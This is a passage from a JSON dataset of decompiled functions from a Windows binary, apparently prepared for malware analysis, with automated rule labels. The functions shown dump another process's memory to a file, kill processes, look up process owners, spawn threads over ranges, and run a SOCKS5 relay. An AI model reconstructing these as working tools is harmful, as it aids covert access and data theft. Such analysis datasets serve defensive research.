= *(in_EAX + 0x40) == '\\0',  uVar5)) {\n                        fcn.0041fe98();\n                        break;\n                    }\n                    fcn.00405e3c();\n                    fcn.00409bc0();\n                    fcn.004057d4();\n                    fcn.00405a44();\n                    fcn.00405974();\n                    if (uVar5) {\n                        fcn.00405a84();\n                        fcn.00405b28();\n                        fcn.00405a44();\n                        fcn.00405b28();\n                        fcn.00405a84();\n                        fcn.004055c8();\n                        fcn.00405864();\n                        fcn.00403770();\n                        **0x49268c = 1;\n                        fcn.00403e84();\n                        fcn.0040305c();\n                        bVar1 = true;\n                        fcn.0047f930(&stack0xfffffffc);\n                    }\n                    else {\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar5) {\n                            fcn.00405a84();\n                            if (bVar1) {\n                                fcn.00403918();\n                                fcn.0040305c();\n                            }\n                            bVar1 = false;\n                            fcn.0047f930(&stack0xfffffffc);\n                        }\n                        else {\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                *(in_EAX + 0x40) = 1;\n                                sub.wsock32.dll_shutdown();\n                                uStackY96 = 0x47fc5e;\n                                sub.wsock32.dll_closesocket();\n                                uStackY96 = 0x47fc65;\n                                fcn.0041fe98();\n                                break;\n                            }\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                if (bVar1) {\n                                    fcn.00403918();\n                                    fcn.0040305c();\n                                }\n                                bVar1 = false;\n                                fcn.0047f930(&stack0xfffffffc);\n                            }\n                            else {\n                                fcn.004038f8(0);\n                                fcn.0040305c();\n                                uStackY96 = 0x47fcd1;\n                                fcn.0047f930(&stack0xfffffffc);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (bVar1) {\n            fcn.00403918();\n            fcn.0040305c();\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0041fe98();\n        iStack64 = iVar4;\n        puVar2 = puStack32;\n    }\ncode_r0x0047fd0b:\n    puStack32 = puVar2;\n    *in_FS_OFFSET = iStack64;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1314
    },
    "00481bac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481bac noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack44 = 0x481bcb;\n    fcn.00405fe8();\n    uStack48 = 0x481ca6;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x481c71;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    fcn.00408550();\n    fcn.004055c8();\n    iVar1 = *(arg_8h + 4);\n    if (iVar1 <= *(arg_8h + 8)) {\n        iVar2 = (*(arg_8h + 8) - iVar1) + 1;\n        var_14h = iVar1;\n        do {\n            if (**0x49252c == '\\0') {\n    // WARNING: Subroutine does not return\n                sub.kernel32.dll_ExitThread_1(0);\n            }\n            iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n            fcn.00405584();\n            *(iVar1 + 4) = var_14h;\n            sub.kernel32.dll_CreateThread_1(0, 0, fcn.00481a04, iVar1, 0, &fcn.00481bac::var_18h);\n            uStack64 = 100;\n            sub.kernel32.dll_Sleep_1();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 512
    },
    "00481eac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00481eac(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x48214b;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00481eac::var_20h;\n    if (*0x492244 != '\\x01') {\n        var_28h = 0x4820ff;\n        var_2ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00481eac::var_2ch;\n        var_18h = &stack0xfffffffc;\n        var_14h = unaff_EDI;\n        var_10h = unaff_ESI;\n        fcn.00405530();\n        *0x492244 = 1;\n        *0x492240 = '\\0';\n        fcn.0046d674();\n        fcn.0040ef34(&fcn.00481eac::var_24h, *0x48215c);\n        fcn.004055c8();\n        fcn.00409b6c();\n        fcn.004055c8();\n        piVar1 = fcn.00404620();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            (**(*piVar1 + 0x48))();\n            fcn.00405b28(&fcn.00481eac::var_10h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00481eac::var_14h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00481eac::var_18h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            iVar2 = 0;\n            do {\n                uVar9 = 0x48217c;\n                uVar7 = 0x48217c;\n                uVar5 = 0x48217c;\n                uVar4 = 0;\n                iVar3 = iVar2;\n                puVar6 = var_18h;\n                uVar8 = var_14h;\n                uVar10 = var_10h;\n                fcn.00409e4c(iVar2);\n                fcn.004058e0(var_2ch, iVar3, uVar4, uVar5, puVar6, uVar7, uVar8, uVar9, uVar10);\n                sub.kernel32.dll_CreateThread_1(0, 0, fcn.00481d54, &fcn.00481eac::var_4h, 0, &fcn.00481eac::var_20h);\n                sub.kernel32.dll_Sleep_1();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0x100);\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n        uVar8 = 0x482188;\n        fcn.004058e0(0x482188, var_18h, 0x48217c, var_14h, 0x48217c, var_10h);\n        while (*0x492240 == '\\0') {\n            uVar8 = 100;\n            sub.kernel32.dll_Sleep_1();\n        }\n        fcn.00405864();\n        fcn.00474d1c();\n        *in_FS_OFFSET = uVar8;\n        *in_FS_OFFSET = var_14h;\n        fcn.00405554(0x482152);\n        fcn.00405554();\n        return;\n    }\n    var_24h = NULL;\n    // WARNING: Subroutine does not return\n    var_28h = 0x482123;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1193
    },
    "004831cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004831cc noreturn (uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint uVar7;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    puStack84 = 0x4831f4;\n    fcn.00405fe8();\n    uStack88 = 0x48341e;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    var_20h = 0;\n    var_28h = 0;\n    var_2ch = 0;\n    uStack96 = 0x483220;\n    puStack84 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_30h = 0;\n    uStack96 = 0x48322d;\n    fcn.00405530();\n    uStack96 = 0x48323c;\n    fcn.00408550();\n    arg_8h_00 = *arg_8h;\n    uVar4 = arg_8h[1];\n    uVar1 = arg_8h[2];\n    uVar2 = arg_8h[3];\n    uStack96 = 0x483258;\n    fcn.004055c8();\n    if (uVar1 == uVar4) {\n        uStack96 = 0x48326b;\n        fcn.00474d1c();\n        uStack96 = 0;\n    // WARNING: Subroutine does not return\n        uStack100 = 0x483272;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    uStack100 = 0;\n    uStack104 = 0x10;\n    puStack108 = 0x48327f;\n    uStack96 = arg_8h_00;\n    var_24h = sub.kernel32.dll_OpenProcess();\n    if (var_24h != 0) {\n        uStack112 = 0x4833d8;\n        iStack116 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff8c;\n        puStack108 = &stack0xfffffffc;\n        iVar3 = fcn.004059dc(0x40000000, 0, 0, 4, 0, 0);\n        var_20h = sub.kernel32.dll_CreateFileA_1();\n        if (var_20h != -1) {\n            fcn.00406928(uVar2);\n            for (; uVar4 < uVar1; uVar4 = uVar4 + uVar5) {\n                uVar5 = uVar2;\n                if (uVar1 - uVar4 < uVar2) {\n                    uVar5 = uVar1 - uVar4;\n                }\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, 4, &fcn.004831cc::var_30h);\n                sub.kernel32.dll_ReadProcessMemory(var_24h, uVar4, var_4h, uVar5, &fcn.004831cc::var_28h);\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, var_30h, &fcn.004831cc::var_30h);\n                iVar3 = var_20h;\n                sub.kernel32.dll_WriteFile_1();\n            }\n            *in_FS_OFFSET = iVar3;\n            fcn.00406934(0x4833df);\n            sub.kernel32.dll_SetEndOfFile_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_24h);\n            uVar7 = 0x4834c8;\n            uVar6 = 0;\n            fcn.00409e4c(arg_8h_00);\n            fcn.004058e0(0x483508, var_8h, 0x4834e8, 0, arg_8h_00, uVar6, uVar7);\n            fcn.00474d1c();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        fcn.00474d1c();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    puStack108 = 0x483292;\n    fcn.00474d1c();\n    puStack108 = NULL;\n    // WARNING: Subroutine does not return\n    uStack112 = 0x483299;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1231
    },
    "00483694": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00483694(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    int32_t iStackY176;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x483831;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_5h = 0;\n    iVar1 = sub.kernel32.dll_OpenProcess(0x400, 0);\n    if (iVar1 != 0) {\n        iVar2 = sub.advapi32.dll_OpenProcessToken(iVar1, 8, &TokenHandle);\n        if (iVar2 != 0) {\n            uVar3 = TokenHandle;\n            iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 1, 0, 0, &TokenInformationLength);\n            TokenInformation = NULL;\n            while (bVar4 = iVar2 == 0,  bVar4) {\n                iVar2 = sub.kernel32.dll_GetLastError_1();\n                if (iVar2 != 0x7a) break;\n                fcn.00402f34();\n                uVar3 = TokenHandle;\n                iVar2 = sub.advapi32.dll_GetTokenInformation();\n            }\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, uVar3);\n            if (bVar4) goto code_r0x00483816;\n            var_1ch = 0;\n            var_20h = 0;\n            sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, 0, &var_1ch, 0, &var_20h, &var_18h);\n            if ((var_1ch != 0) && (var_20h != 0)) {\n                fcn.00405c6c();\n                fcn.00405c6c();\n                uVar3 = fcn.004059dc(&var_20h, &var_18h);\n                uVar3 = fcn.004059dc(&var_1ch, uVar3);\n                iVar2 = sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, uVar3);\n                if (iVar2 != 0) {\n                    var_5h = 1;\n                    fcn.004059dc();\n                    fcn.0040aa98();\n                    fcn.00405584();\n                    fcn.004059dc();\n                    fcn.0040aa98();\n                    fcn.00405584();\n                }\n            }\n            if (!bVar4) {\n                fcn.00402f1c();\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY176 = iVar1;\n    }\ncode_r0x00483816:\n    *in_FS_OFFSET = iStackY176;\n    fcn.00405554(0x483838);\n    return;\n}\n",
        "token_count": 738
    },
    "00483944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00483944(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t hProcess;\n    uint lpExitCode;\n    \n    uStack20 = 0;\n    uStack24 = 1;\n    puStack28 = 0x483954;\n    hProcess = sub.kernel32.dll_OpenProcess();\n    if (hProcess != 0) {\n        uStack32 = 0x48399c;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_GetExitCodeProcess(hProcess, &fcn.00483944::lpExitCode);\n        iVar1 = hProcess;\n        sub.kernel32.dll_TerminateProcess(hProcess, lpExitCode);\n        *in_FS_OFFSET = iVar1;\n        sub.kernel32.dll_CloseHandle_1(hProcess, 0x4839a3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "004839a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004839a8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint var_108h;\n    uint hObject;\n    \n    uStack280 = 0x4839c3;\n    fcn.00405584();\n    uStack284 = 0;\n    uStack288 = 0x1f0fff;\n    puStack292 = 0x4839d0;\n    iVar1 = sub.kernel32.dll_OpenProcess();\n    uStack296 = 0x483a37;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    if (iVar1 == 0) {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404f70();\n    }\n    else {\n        uVar3 = 0x104;\n        puStack292 = &stack0xfffffffc;\n        iVar2 = fcn.004610a4(0x104);\n        if (iVar2 != 0) {\n            fcn.004057a0();\n            *in_FS_OFFSET = uVar3;\n            uStack296 = 0x483a3e;\n            iStack300 = iVar1;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        fcn.00404f70();\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "00484708": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484708(void)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x484784;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    puVar2 = &stack0xfffffffc;\n    if (*(in_EAX + 0x40) != 0) {\n        fcn.0040f934();\n        puVar2 = puStack20;\n    }\n    puStack20 = puVar2;\n    if (*(*0x498394 + 0xec) != '\\0') {\n        fcn.00466680();\n    }\n    fcn.00466b38();\n    fcn.0040f934();\n    fcn.0040f934();\n    sub.wsock32.dll_shutdown(*0x49a39c, 2);\n    uVar1 = *0x49a39c;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 269
    },
    "004848f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004848f0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_2eh;\n    uint16_t var_10h;\n    int32_t var_eh;\n    int32_t var_ah;\n    int16_t var_6h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x484a5a;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack76;\n    fcn.00484708();\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x40) = uVar2;\n    cVar1 = fcn.0048479c();\n    if (cVar1 != '\\0') {\n        var_eh = *(in_EAX + 0x44);\n        var_10h = *(in_EAX + 0x48);\n        var_4h._0_2_ = *(in_EAX + 0x4c);\n        var_ah = var_10h * var_eh * 2;\n        var_6h = var_10h * 2;\n        if (*0x498394 == 0) {\n            *0x498394 = fcn.0046642c();\n        }\n        if (*0x498398 == 0) {\n            *0x498398 = fcn.004668c0();\n        }\n        iVar3 = *0x498398;\n        *(*0x498398 + 0xa4) = *(in_EAX + 0x40);\n        *(iVar3 + 0xa0) = fcn.00484a6c;\n        *(*0x498394 + 0x15e) = var_10h;\n        *(*0x498394 + 0x160) = var_eh;\n        *(*0x498394 + 0x164) = var_ah;\n        *(*0x498394 + 0x168) = var_6h;\n        *(*0x498394 + 0x16a) = var_4h;\n        fcn.0046669c();\n        fcn.00466b90();\n        fcn.00466680();\n        fcn.00466a58();\n        while (*(in_EAX + 0xd) == '\\0') {\n            while( true ) {\n                puStack76 = &var_2eh;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                sub.user32.dll_TranslateMessage(&var_2eh);\n                puStack76 = &var_2eh;\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    fcn.00484708();\n    *in_FS_OFFSET = puStack76;\n    return;\n}\n",
        "token_count": 673
    },
    "00484bd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484bd8(void)\n\n{\n    char cVar1;\n    \n    **0x49252c = 0;\n    **0x49253c = 0;\n    fcn.00485cd4();\n    if (**0x4923a8 != 0) {\n        cVar1 = fcn.00487f90();\n        if (cVar1 != '\\0') {\n            fcn.0041fe98();\n        }\n    }\n    if (**0x4923bc != 0) {\n        cVar1 = fcn.00486af4();\n        if (cVar1 != '\\0') {\n            fcn.0041fe98();\n        }\n    }\n    if ((**0x4926ac != 0) && (**0x49270c != 0)) {\n        (***0x492758)();\n    }\n    **0x4924b0 = 0;\n    sub.wsock32.dll_shutdown(**0x4925a8, 2);\n    sub.wsock32.dll_closesocket(**0x4925a8);\n    **0x4925a8 = 0;\n    fcn.00484c90();\n    return;\n}\n",
        "token_count": 258
    },
    "00484f60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00484f60(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uVar4;\n    uint uStack5840;\n    uint uStack5836;\n    uchar *puStack5832;\n    uint var_16b4h;\n    uint *var_16b0h;\n    int32_t iStack5808;\n    uint uStack5804;\n    uint var_16a4h;\n    uint *puStack5796;\n    uint uStack5792;\n    uint uStack5788;\n    uint var_15a0h;\n    uint var_159ch;\n    uint var_158eh;\n    uint var_58eh;\n    uint var_399h;\n    uint var_140h;\n    uint8_t var_13ch;\n    uint var_138h;\n    uint var_132h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack5832 = 0x484f8c;\n    fcn.00405fe8();\n    uStack5836 = 0x48545e;\n    uStack5840 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe930;\n    puStack5832 = &stack0xfffffffc;\n    fcn.00408550();\n    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00484f60::var_132h, 2, 2);\n    if (((iVar2 < 1) || (var_132h != '\\x05')) ||\n       (sub.wsock32.dll_recv(var_10h, &fcn.00484f60::var_132h, var_132h._1_1_ + 2, 0),  var_132h._1_1_ - 1 < 0))\n    goto code_r0x00485429;\n    var_24h = 0;\n    if (var_132h._2_1_ == '\\x02') {\n        if ((var_18h == 0) && (var_14h == 0)) {\n            var_132h._1_1_ = 0;\n            sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_132h, 2, 0);\n        }\n        else {\n            var_132h._1_1_ = 2;\n            sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_132h, 2, 0);\n            sub.wsock32.dll_recv(var_10h, &fcn.00484f60::var_399h, 0x259, 0);\n            if (var_399h == '\\x01') {\n                fcn.00405620();\n                uVar3 = var_399h._1_1_ == 0xfffffffe;\n                fcn.00405620();\n                fcn.00405974();\n                if ((!uVar3) || (fcn.00405974(),  !uVar3)) {\n                    var_399h._1_1_ = 0xff;\n                    sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_399h, 2, 0);\n                    goto code_r0x00485429;\n                }\n                var_399h._1_1_ = 0;\n                sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_399h, 2, 0);\n            }\n        }\n    }\n    else if (var_132h._2_1_ == '\\0') {\n        if ((var_14h != 0) || (var_18h != 0)) {\n            var_132h._1_1_ = 0xff;\n            sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_132h, 2, 0);\n            goto code_r0x00485429;\n        }\n        var_132h._1_1_ = 0;\n        sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_132h, 2, 0);\n    }\n    else if (var_132h._1_1_ == 0) {\n        var_132h._1_1_ = 0xff;\n        sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_132h, 2, 0);\n        goto code_r0x00485429;\n    }\n    uStack5788 = 2;\n    uStack5792 = 0xc;\n    puStack5796 = &fcn.00484f60::var_140h;\n    uStack5804 = 0x48518e;\n    sub.wsock32.dll_recv();\n    if (var_140h._1_1_ == '\\x01') {\n        uStack5804 = 0x4851ad;\n        fcn.00403af4();\n        if (var_140h._3_1_ == '\\x01') {\n            uStack5804 = 0;\n            iStack5808 = 0xc;\n            var_16b0h = &fcn.00484f60::var_140h;\n            sub.wsock32.dll_recv();\n            var_15a0h._2_2_ = var_138h;\n            fcn.00408550();\n        }\n        else if (var_140h._3_1_ == '\\x03') {\n            uStack5804 = 0x48520c;\n            fcn.00403af4();\n            uStack5804 = 0;\n            iStack5808 = var_13ch + 7;\n            var_16b0h = &fcn.00484f60::var_58eh;\n            var_16b4h = var_10h;\n            sub.wsock32.dll_recv();\n            fcn.00405620();\n            fcn.004059dc();\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            var_159ch = ***(iVar2 + 0xc);\n            var_15a0h._2_2_ = sub.wsock32.dll_htons();\n        }\n        var_15a0h._0_2_ = 2;\n        puStack5832 = 0x1;\n        uStack5836 = 2;\n        uStack5840 = 0x485291;\n        unaff_ESI = sub.wsock32.dll_socket();\n        uStack5840 = 0x10;\n        iVar2 = sub.wsock32.dll_connect(unaff_ESI, &fcn.00484f60::var_15a0h);\n        var_140h._1_1_ = iVar2 != 0;\n        var_140h._0_1_ = 5;\n        var_140h._2_1_ = 0;\n        var_140h._3_1_ = '\\x01';\n        fcn.00403af4();\n        var_30h = 0x10;\n        sub.wsock32.dll_getsockname(unaff_ESI, &fcn.00484f60::var_16b4h, &fcn.00484f60::var_30h);\n        fcn.00408550();\n        var_138h._0_2_ = var_16b4h._2_2_;\n        sub.wsock32.dll_send(var_10h, &fcn.00484f60::var_140h, 10, 0);\n        var_2ch = 5;\n        do {\n            fcn.00408728();\n            fcn.00408718();\n            fcn.00408718();\n            uVar4 = 0;\n            iVar2 = sub.wsock32.dll_select();\n            if (iVar2 != -1) {\n                cVar1 = fcn.00408700();\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 == -1) break;\n                    uVar4 = var_10h;\n                    sub.wsock32.dll_send();\n                }\n                cVar1 = fcn.00408700(uVar4);\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00484f60::var_158eh, 0x1000, 0);\n                    if (iVar2 == -1) break;\n                    sub.wsock32.dll_send(unaff_ESI, &fcn.00484f60::var_158eh, iVar2, 0);\n                }\n            }\n            sub.kernel32.dll_Sleep_1(0x96);\n        } while( true );\n    }\ncode_r0x00485429:\n    sub.wsock32.dll_closesocket(var_10h);\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = unaff_ESI;\n    fcn.004060ac(0x485465);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2108
    },
    "0048619c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
